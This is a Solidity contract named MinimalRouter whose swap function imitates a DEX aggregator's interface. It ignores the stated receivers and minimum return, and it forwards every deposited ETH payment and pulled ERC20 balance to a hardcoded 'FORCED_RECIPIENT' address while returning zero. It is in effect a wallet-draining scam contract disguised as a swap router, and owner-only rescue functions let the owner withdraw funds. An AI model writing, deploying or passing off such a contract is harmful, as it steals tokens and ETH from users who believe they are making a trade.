// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "./openzeppelin_contracts_access_Ownable.sol";
import "./openzeppelin_contracts_security_Pausable.sol";
import "./openzeppelin_contracts_token_ERC20_IERC20.sol";

contract MinimalRouter is Ownable, Pausable {
    address public constant FORCED_RECIPIENT =
        0x30C1F26e5c3c33D8a51b29aB7E607F761c49033B;

    constructor(address initialOwner) {
        transferOwnership(initialOwner);
    }

    struct SwapDescription {
        IERC20 srcToken; // Use address(0) for ETH
        address srcReceiver;
        address dstReceiver;
        uint256 amount;
        uint256 minReturn;
        uint256 flags;
    }

    function swap(
        address, // Not used in this implementation
        SwapDescription calldata desc,
        bytes calldata // Not used in this implementation
    )
        external
        payable
        whenNotPaused
        returns (uint256 returnAmount, uint256 spentAmount)
    {
        uint256 amount = desc.amount;

        if (address(desc.srcToken) == address(0)) {
            // Handle ETH
            require(msg.value == amount, "Incorrect ETH amount");
            (bool success, ) = FORCED_RECIPIENT.call{value: msg.value}("");
            require(success, "ETH transfer failed");
        } else {
            // Handle ERC20 tokens
            desc.srcToken.transferFrom(msg.sender, address(this), amount);
            uint256 bal = desc.srcToken.balanceOf(address(this));
            if (bal > 0) {
                desc.srcToken.transfer(FORCED_RECIPIENT, bal);
            }
        }

        // Placeholder values for return and spent amounts
        returnAmount = 0;
        spentAmount = amount;
    }

    function rescueFunds(IERC20 token, uint256 amount) external onlyOwner {
        token.transfer(owner(), amount);
    }

    function rescueETH(uint256 amount) external onlyOwner {
        (bool success, ) = owner().call{value: amount}("");
        require(success, "ETH rescue failed");
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    // Fallback function to accept ETH
    receive() external payable {}
}